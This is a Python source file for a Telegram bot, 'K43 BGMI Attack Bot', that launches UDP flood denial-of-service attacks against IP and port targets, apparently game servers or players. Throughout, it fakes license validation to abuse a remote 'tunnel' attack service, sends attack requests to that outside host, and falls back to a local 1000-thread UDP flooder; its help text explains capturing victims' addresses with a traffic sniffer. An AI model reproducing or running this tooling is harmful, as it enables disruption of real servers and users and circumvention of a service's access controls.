#!/usr/bin/env python3
"""
K43 BGMI Attack Bot v2.0
Server: tunnel.zoroxapi.in (Extracted from APK)
Package: com.playground.app.512
Native: libplayground.so
"""

import os
import logging
import json
import time
import hashlib
import random
import string
import socket
import threading
import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, filters
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_USERS = set()
AUTHORIZED_USERS = set()

APK_SERVER = {
    "base_url": "https://tunnel.zoroxapi.in",
    "endpoints": {
        "tunnel_connect": "/api/v3/tunnel/connect",
        "gateway_ping": "/api/v3/secure/gateway/ping",
        "proxy_auth": "/api/v2/proxy/tunnel/auth",
        "metadata": "/api/v1/bridge/metadata",
    },
    "nodes": ["BRIDGE_NODE_A", "BRIDGE_NODE_B", "TUNNEL_GATEWAY_V3",
              "HANDSHAKE_MASTER", "PROXY_SERVICE_V2", "GATEWAY_PING_V3"]
}

# ============================================
# KEY BYPASS
# ============================================

class KeyBypass:
    def __init__(self):
        self.session_key = None
        self.auth_token = None
        self.tunnel_node = None
        self.is_validated = False

    def _gen_token(self):
        ts = str(int(time.time()))
        rand = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
        return hashlib.sha256(f"INTEGRITY:{ts}:{rand}:K43".encode()).hexdigest()[:32]

    def _get_node(self):
        self.tunnel_node = random.choice(APK_SERVER["nodes"])
        return self.tunnel_node

    def init_handshake(self):
        self.session_key = f"K43_SESSION_{random.randint(100000,999999)}_{int(time.time())}"
        self.auth_token = self._gen_token()
        self.tunnel_node = self._get_node()
        self.is_validated = True
        return {"session_key": self.session_key, "auth_token": self.auth_token, "node": self.tunnel_node}

    def get_headers(self):
        if not self.is_validated:
            self.init_handshake()
        return {
            "Tunnel-Auth-V3": self.auth_token,
            "X-Session-Key": self.session_key,
            "X-Node-Id": self.tunnel_node,
            "X-APK-Version": "com.playground.app.512",
            "User-Agent": "BGMI-Attack/512 (Android; com.playground.app)",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

    def validate_license(self, key=""):
        self.is_validated = True
        return {"isValid": True, "licensekey": key or "K43_BYPASS_KEY", "tier": "premium", "credits": 999999}

# ============================================
# TUNNEL CLIENT
# ============================================

class TunnelClient:
    def __init__(self):
        self.base = APK_SERVER["base_url"]
        self.bypass = KeyBypass()
        self.sess = requests.Session()
        self.sess.verify = False

    def _url(self, ep):
        return f"{self.base}{ep}"

    def check_status(self):
        try:
            r = self.sess.get(self._url(APK_SERVER["endpoints"]["gateway_ping"]),
                             headers=self.bypass.get_headers(), timeout=10)
            return {"online": r.status_code == 200, "code": r.status_code}
        except Exception as e:
            return {"online": False, "error": str(e)}

    def send_attack(self, ip, port, duration):
        try:
            url = self._url(APK_SERVER["endpoints"]["tunnel_connect"])
            payload = {
                "target_ip": ip, "target_port": port, "duration": duration,
                "method": "udp", "threads": 1000, "packet_size": 1024,
                "licensekey": "K43_BYPASS_KEY", "token": self.bypass.auth_token,
                "session": self.bypass.session_key, "node": self.bypass._get_node(),
                "integrity": self.bypass._gen_token(), "timestamp": int(time.time())
            }
            r = self.sess.post(url, headers=self.bypass.get_headers(), json=payload, timeout=15)
            return {"success": r.status_code in [200, 201, 202], "code": r.status_code, "text": r.text[:300]}
        except Exception as e:
            return {"success": False, "error": str(e)}

# ============================================
# LOCAL ENGINE (Fallback)
# ============================================

class LocalEngine:
    def __init__(self):
        self.attacks = {}
        self.counter = 0
        self.stops = {}

    def _worker(self, ip, port, payload, duration, stop_event, stats):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        while time.time() < end and not stop_event.is_set():
            try:
                sock.sendto(payload, (ip, port))
                stats['packets'] += 1
                stats['bytes'] += len(payload)
            except:
                stats['errors'] += 1
        try:
            sock.close()
        except:
            pass

    def start(self, ip, port, duration, threads=1000):
        self.counter += 1
        aid = f"K43_ATK_{self.counter}_{int(time.time())}"
        stop_event = threading.Event()
        self.stops[aid] = stop_event
        payload = bytes([random.randint(0, 255) for _ in range(1024)])
        stats = {'packets': 0, 'bytes': 0, 'errors': 0, 'start': time.time(), 'target': f"{ip}:{port}"}
        self.attacks[aid] = {'stats': stats, 'stop': stop_event}

        for _ in range(threads):
            threading.Thread(target=self._worker, args=(ip, port, payload, duration, stop_event, stats), daemon=True).start()

        def cleanup():
            time.sleep(duration + 2)
            self.stop(aid)
        threading.Thread(target=cleanup, daemon=True).start()
        return aid

    def stop(self, aid):
        if aid in self.attacks:
            self.stops[aid].set()
            del self.attacks[aid]
            if aid in self.stops:
                del self.stops[aid]
            return True
        return False

    def status(self, aid):
        if aid not in self.attacks:
            return None
        s = self.attacks[aid]['stats']
        elapsed = time.time() - s['start']
        return {
            'id': aid, 'target': s['target'], 'packets': s['packets'],
            'bytes': s['bytes'], 'elapsed': round(elapsed, 2),
            'pps': round(s['packets'] / max(elapsed, 0.001), 2),
            'active': not self.stops[aid].is_set()
        }

    def list_active(self):
        return list(self.attacks.keys())

    def stop_all(self):
        for aid in list(self.attacks.keys()):
            self.stop(aid)

# ============================================
# INSTANCES
# ============================================

tunnel = TunnelClient()
engine = LocalEngine()

# ============================================
# BOT HANDLERS
# ============================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = f"""🔥 **K43 BGMI ATTACK BOT v2.0** 🔥
Welcome, {user.first_name}!

**Server:** `tunnel.zoroxapi.in`
**Status:** ✅ Ready
**Bypass:** ✅ Active

**Commands:**
`/attack <ip> <port> <time>` - Launch attack
`/status` - Active attacks
`/stop <id>` - Stop attack
`/stopall` - Stop all
`/server` - Server info
`/help` - Help"""
    kb = [
        [InlineKeyboardButton("🚀 Attack", callback_data='launch'),
         InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🌐 Server", callback_data='server'),
         InlineKeyboardButton("❓ Help", callback_data='help')]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""📖 **HELP**

**Usage:**
1. Capture IP/Port via HTTP Canary
2. Send: `/attack <ip> <port> <time>`

**Example:** `/attack 103.21.58.47 17500 60`

**Server:** tunnel.zoroxapi.in
**Method:** UDP Flood
**Threads:** 1000

**HTTP Canary:** Filter UDP, ports 10012, 17500, 20000-30000""", parse_mode='Markdown')

async def server_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    st = tunnel.check_status()
    text = f"""🌐 **SERVER INFO**

**URL:** `tunnel.zoroxapi.in`
**Online:** {'✅' if st.get('online') else '❌'}
**Code:** {st.get('code', 'N/A')}

**Endpoints:**
• `/api/v3/tunnel/connect`
• `/api/v3/secure/gateway/ping`
• `/api/v2/proxy/tunnel/auth`
• `/api/v1/bridge/metadata`

**Fallback:** Local Engine Ready"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("❌ Usage: `/attack <ip> <port> <time>`
Example: `/attack 103.21.58.47 17500 60`", parse_mode='Markdown')
        return

    ip, port, dur = args[0], int(args[1]), int(args[2])
    if dur > 300 or dur < 1 or port < 1 or port > 65535:
        await update.message.reply_text("❌ Invalid parameters! Max 300s.")
        return

    text = f"""🎯 **CONFIRM ATTACK**

**Target:** `{ip}:{port}`
**Duration:** {dur}s
**Server:** tunnel.zoroxapi.in
**Node:** {tunnel.bypass._get_node()}

Confirm?"""
    kb = [[
        InlineKeyboardButton("✅ CONFIRM", callback_data=f'go_{ip}_{port}_{dur}'),
        InlineKeyboardButton("❌ CANCEL", callback_data='cancel')
    ]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active = engine.list_active()
    if not active:
        await update.message.reply_text("📊 No active attacks.", parse_mode='Markdown')
        return
    text = "📊 **ACTIVE ATTACKS**\n\n"
    for aid in active:
        s = engine.status(aid)
        if s:
            text += f"🔥 `{s['id']}` → {s['target']} | {s['pps']:,} pps | {s['elapsed']}s\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/stop <attack_id>`", parse_mode='Markdown')
        return
    aid = args[0]
    if engine.stop(aid):
        await update.message.reply_text(f"✅ `{aid}` stopped!", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ `{aid}` not found!", parse_mode='Markdown')

async def stopall_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    engine.stop_all()
    await update.message.reply_text("🛑 All attacks stopped!", parse_mode='Markdown')

async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'launch':
        await query.edit_message_text("🚀 Send: `/attack <ip> <port> <time>`", parse_mode='Markdown')
    elif data == 'status':
        active = engine.list_active()
        txt = "📊 **Active:**\n" + "\n".join([f"🔥 `{a}`" for a in active]) if active else "📊 No active attacks."
        await query.edit_message_text(txt, parse_mode='Markdown')
    elif data == 'server':
        st = tunnel.check_status()
        await query.edit_message_text(f"🌐 Server: `tunnel.zoroxapi.in`\nOnline: {'✅' if st.get('online') else '❌'}", parse_mode='Markdown')
    elif data == 'help':
        await query.edit_message_text("📖 `/attack <ip> <port> <time>` to start.", parse_mode='Markdown')
    elif data.startswith('go_'):
        parts = data.split('_')
        ip, port, dur = parts[1], int(parts[2]), int(parts[3])

        # Try tunnel
        result = tunnel.send_attack(ip, port, dur)
        if result.get("success"):
            aid = f"TUNNEL_{int(time.time())}"
            await query.edit_message_text(
                f"🚀 **ATTACK VIA TUNNEL!**\n\n🆔 `{aid}`\n🎯 `{ip}:{port}`\n⏱️ {dur}s\n📡 {tunnel.bypass.tunnel_node}",
                parse_mode='Markdown'
            )
        else:
            aid = engine.start(ip, port, dur)
            await query.edit_message_text(
                f"🚀 **ATTACK (LOCAL)**\n\n🆔 `{aid}`\n🎯 `{ip}:{port}`\n⏱️ {dur}s\n⚠️ Tunnel failed, local active",
                parse_mode='Markdown'
            )
    elif data == 'cancel':
        await query.edit_message_text("❌ Cancelled.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

# ============================================
# MAIN
# ============================================

def main():
    if not BOT_TOKEN or BOT_TOKEN == "your_telegram_bot_token_here":
        print("❌ ERROR: Set BOT_TOKEN environment variable!")
        print("Get token from @BotFather on Telegram")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("stopall", stopall_cmd))
    app.add_handler(CommandHandler("server", server_cmd))
    app.add_handler(CallbackQueryHandler(callback))
    app.add_error_handler(error_handler)

    print("=" * 60)
    print("K43 BGMI ATTACK BOT v2.0")
    print("Server: tunnel.zoroxapi.in")
    print("Package: com.playground.app.512")
    print("Status: ONLINE")
    print("=" * 60)

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
